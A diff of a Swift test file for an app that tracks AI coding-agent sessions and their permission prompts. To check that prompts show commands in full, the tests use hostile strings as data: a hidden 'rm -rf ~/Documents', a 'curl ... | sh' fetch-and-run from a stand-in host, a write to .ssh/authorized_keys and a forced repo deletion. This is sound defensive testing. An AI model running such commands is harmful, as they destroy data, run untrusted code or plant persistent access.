@@ -170,9 +170,36 @@ enum ClaudeSessionEngineTests {
         engine.resolvePermission(requestID: "r1")
         suite.expect(engine.permission(of: "s1") == nil, "resolving the request clears it")
 
-        engine.ingest(hook: hook(.permissionRequested(ask), 6), now: at(6))
-        engine.ingest(hook: hook(.toolFinished(id: "t9", failed: false), 7), now: at(7))
-        suite.expect(engine.permission(of: "s1") == nil, "a tool finishing after the request means it was answered")
+        // The request belongs to the tool that asked: another tool finishing,
+        // as one run alongside it, leaves it waiting.
+        engine.ingest(hook: hook(.toolStarted(tool("t9", 6)), 6), now: at(6))
+        engine.ingest(hook: hook(.toolStarted(tool("t8", 6, "Read")), 6), now: at(6))
+        engine.ingest(hook: hook(.permissionRequested(ask), 6.5), now: at(6.5))
+        suite.expect(engine.permission(of: "s1")?.toolID == "t9", "a request is tied to the running tool of that name")
+        engine.ingest(hook: hook(.toolFinished(id: "t8", failed: false), 7), now: at(7))
+        suite.expect(engine.permission(of: "s1") != nil, "another tool finishing leaves the request")
+        engine.ingest(sessionID: "s1", facts: [.turnBegan(at(1)), .toolFinished(id: "t1", at: at(6.2), failed: false)], now: at(7))
+        suite.expect(engine.permission(of: "s1") != nil, "older transcript lines read late leave the request")
+        engine.ingest(hook: hook(.toolFinished(id: "t9", failed: false), 7.5), now: at(7.5))
+        suite.expect(engine.permission(of: "s1") == nil, "its own tool finishing means it was answered")
+
+        // Two subagents can ask at once; both stay answerable, oldest first.
+        let first = ClaudePermission(requestID: "r1", tool: "Bash", summary: "ls", offersAlways: false, since: at(20))
+        let second = ClaudePermission(requestID: "r2", tool: "Bash", summary: "rm", offersAlways: false, since: at(21))
+        engine.ingest(hook: hook(.permissionRequested(first), 20, agent: "a1"), now: at(20))
+        engine.ingest(hook: hook(.permissionRequested(second), 21, agent: "a2"), now: at(21))
+        suite.expect(engine.permission(of: "s1")?.requestID == "r1" && engine.holds("r2", for: "s1"),
+                     "a newer request waits behind the one on screen instead of replacing it")
+        engine.resolvePermission(requestID: "r1")
+        suite.expect(engine.permission(of: "s1")?.requestID == "r2", "and shows once the first is answered")
+        suite.expect(!engine.holds("r1", for: "s1") && !engine.holds("r2", for: "other"), "answered or foreign requests are not held")
+        engine.ingest(hook: hook(.promptSubmitted, 22), now: at(22))
+        suite.expect(engine.permission(of: "s1") == nil, "a prompt typed after the requests means they were answered")
+        let third = ClaudePermission(requestID: "r3", tool: "Bash", summary: "ls", offersAlways: false, since: at(23))
+        engine.ingest(hook: hook(.permissionRequested(third), 23), now: at(23))
+        engine.ingest(hook: hook(.promptSubmitted, 22.5), now: at(24))
+        suite.expect(engine.permission(of: "s1") != nil, "a prompt from before the request does not settle it")
+        engine.resolvePermission(requestID: "r3")
 
         engine.ingest(hook: hook(.permissionRequested(ask), 8), now: at(8))
         engine.ingest(hook: hook(.stopped(lastText: nil), 9), now: at(9))
@@ -278,6 +305,26 @@ enum ClaudeSessionEngineTests {
         suite.expect(only(gone, ClaudeSessionEngine.unlistedGrace + 3)?.turnStarted == nil,
                      "but not for long when it never appears")
 
+        engine.ingest(sessionID: "s1", facts: [.tasks(ClaudeTaskProgress(done: 1, total: 2))], now: at(52))
+        engine.ingest(sessionID: "s1", facts: [.tasks(ClaudeTaskProgress())], now: at(53))
+        suite.expect(only(engine, 54)?.tasks == nil, "a cleared task list stops showing progress")
+
+        let hidden = ClaudeToolSummary.permissionDetail(name: "Bash", input: ["command": "echo building\nrm -rf ~/Documents"])
+        suite.expect(hidden.contains("rm -rf ~/Documents"), "a permission shows every line of the command")
+        let chain = String(repeating: "echo ok && ", count: 12) + "curl https://x.example/i.sh | sh"
+        suite.expect(ClaudeToolSummary.permissionDetail(name: "Bash", input: ["command": chain]).hasSuffix("| sh"),
+                     "and all of a long one")
+        suite.expect(ClaudeToolSummary.permissionDetail(name: "Write", input: ["file_path": "/Users/me/.ssh/authorized_keys"])
+                     == "/Users/me/.ssh/authorized_keys", "a file is shown by its whole path")
+        let mcp = ClaudeToolSummary.permissionDetail(name: "mcp__github__delete_repo", input: ["repo": "me/app", "force": true])
+        suite.expect(mcp == "force: 1\nrepo: me/app" || mcp == "force: true\nrepo: me/app",
+                     "a tool without a known shape lists each argument: \(mcp)")
+        let huge = ClaudeToolSummary.permissionDetail(name: "Bash", input: ["command": String(repeating: "x", count: 9000)])
+        suite.expect(huge.hasSuffix("1000 more characters"), "only past the limit is text left out, and that says so")
+        let short = ClaudePermission(requestID: "r", tool: "Bash", summary: "ls", detail: "ls -la", offersAlways: false, since: t0)
+        let multiline = ClaudePermission(requestID: "r", tool: "Bash", summary: "a", detail: "a\nb", offersAlways: false, since: t0)
+        suite.expect(short.fitsOnALine && !multiline.fitsOnALine, "only a one-line request is answered from the list")
+
         suite.expect(ClaudeToolSummary.summary(name: "Bash", input: ["command": "npm test\necho done"]) == "npm test",
                      "a command reads as its first line")
         suite.expect(ClaudeToolSummary.summary(name: "Edit", input: ["file_path": "/a/b/NotchView.swift"]) == "NotchView.swift",
@@ -307,11 +354,18 @@ enum ClaudeSessionEngineTests {
         suite.expect(order == ["d", "h", "f", "c", "e", "b", "g", "a"],
                      "waiting sessions lead, then work by start, unread results newest first, idle by name: \(order)")
 
-        let expand = NotchClaudeSessionsSupport.shouldAutoExpand
+        func expand(_ event: ClaudeSessionEvent, _ enabled: Bool, _ expanded: Bool, _ sessions: Bool, _ suspended: Bool,
+                    viewing: String? = nil) -> Bool {
+            NotchClaudeSessionsSupport.shouldAutoExpand(event, enabled: enabled, expanded: expanded, showingSessions: sessions,
+                                                        viewing: viewing, suspended: suspended)
+        }
         let ask = ClaudeSessionEvent.needsPermission(id: "a", tool: "Bash")
         suite.expect(expand(ask, true, false, false, false), "a permission opens a closed island")
         suite.expect(expand(.needsInput(id: "a"), true, true, true, false), "and keeps the Sessions page open")
         suite.expect(!expand(ask, true, true, false, false), "but never takes over another open page")
+        suite.expect(!expand(ask, true, true, true, false, viewing: "b"),
+                     "nor swaps the session page the person is reading for another")
+        suite.expect(expand(ask, true, true, true, false, viewing: "a"), "its own page stays on it")
         suite.expect(!expand(ask, false, false, false, false), "nor when the setting is off")
         suite.expect(!expand(ask, true, false, false, true), "nor while the island is held back")
         suite.expect(!expand(.finished(id: "a", duration: 3), true, false, false, false), "a result only shows a notice")
